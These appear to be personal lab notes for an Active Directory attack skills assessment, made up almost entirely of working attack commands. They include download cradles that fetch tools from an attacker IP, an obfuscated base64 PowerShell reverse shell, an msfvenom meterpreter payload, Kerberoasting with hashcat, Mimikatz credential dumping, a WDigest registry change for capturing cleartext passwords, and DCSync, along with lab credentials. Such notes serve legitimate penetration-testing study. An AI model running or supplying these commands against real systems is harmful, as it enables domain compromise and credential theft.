# Part I

AD Enumeration & Attacks - Skills Assessment Part I

Scenario
password-protected web shell (with the credentials: admin:My_W3bsH3ll_P@ssw0rd!) in place for us to start from in the /uploads directory.


Inlanefreight

Host Discovery:
arp -a



powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.30/PowerView.ps1', 'PowerView.ps1')

Better One to install using PS:
Invoke-WebRequest -Uri "http://10.10.15.253:8080/shell.exe" -OutFile "C:\shell.exe"

certutil.exe -urlcache -split -f "http://10.10.16.30/PowerView.ps1"


powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==


Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat

svc_sql:lucky7

$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)
Enter-PSSession -ComputerName ACADEMY-EA-SQL01 -Credential $cred

certutil.exe -urlcache -split -f "http://10.10.16.30/SharpHound.exe"


certutil.exe -urlcache -split -f "http://10.10.16.30/SharpHound.ps1"


$username = "inlanefreight\svc_sql"
$password = "lucky7"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)

Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $cred

Standard Payload:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.253 LPORT=9999 -f exe > shell.exe

msfconsole > use multi/handler > set LHOST 10.10.15.253 > set LPORT 9999 > set payload windows/x64/meterpreter/reverse_tcp

Kerberoasting:
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Get-DomainUser -Identity svc_sql -SPN | Get-DomainSPNTicket –Format Hashcat | Out-File .\svc_sql_tgs_hash.txt

hashcat -m 13100 cleanhash /usr/share/wordlists/rockyou.txt


Find listening ports on Windows host using PS:
Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' }

xfreerdp file transfer with shares:
xfreerdp /v:localhost:8787 /u:”inlanefreight\svc_sql” /p:lucky7 /drive:<Drive-name>,/kali/folder/path


Getting hashusing mimikatz:
privilege::debug
sekurlsa::msv
logonpasswords

enable WDigest on the machine to receive cleartext creds for this authentication method:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown /r /t 0 /f

Run as different using in RDP:
runas /netonly /user:INLANEFREIGHT\tpetty powershell

DC Sync using Mimikatz:
lsadump::dcsync /domain:inlanefreight.local /user:inlanefreight\Administrator




